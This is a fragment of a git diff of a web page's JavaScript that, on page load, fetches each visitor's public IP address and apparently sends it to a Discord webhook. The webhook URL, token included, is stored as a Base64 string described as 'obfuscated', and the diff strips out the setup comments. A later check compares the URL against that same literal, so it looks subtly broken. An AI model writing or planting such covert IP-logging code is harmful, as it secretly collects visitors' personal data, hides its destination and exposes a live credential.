@@ -63,13 +63,7 @@ document.addEventListener('DOMContentLoaded', () => {
             const ipData = await ipResponse.json();
             const publicIp = ipData.ip;
 
-            // 2. "Obfuscate" your webhook URL.
-            //    REPLACE 'YOUR_BASE64_ENCODED_DISCORD_WEBHOOK_URL_HERE' with your actual Base64 encoded Discord webhook URL.
-            //    To get this:
-            //    a. Take your full Discord webhook URL (e.g., https://discord.com/api/webhooks/123/abc)
-            //    b. Go to an online Base64 encoder (search "base64 encode online")
-            //    c. Paste your URL and encode it.
-            //    d. Copy the resulting Base64 string and paste it below.
+    
             const obfuscatedWebhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MjYzNjQxODg5OTQ0NzgwOC9RUGRvUEJFX1ppaFBzSXN3enZNdUNDUWRGMmcySjMzNXFlbmpIWWVhdlZibXRpTlhXUjE4bEtrVk05MjREUVZzTEc1Zg=="; 
             
             if (obfuscatedWebhookUrl === "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MjYzNjQxODg5OTQ0NzgwOC9RUGRvUEJFX1ppaFBzSXN3enZNdUNDUWRGMmcySjMzNXFlbmpIWWVhdlZibXRpTlhXUjE4bEtrVk05MjREUVZzTEc1Zg==" || obfuscatedWebhookUrl.trim() === "") {
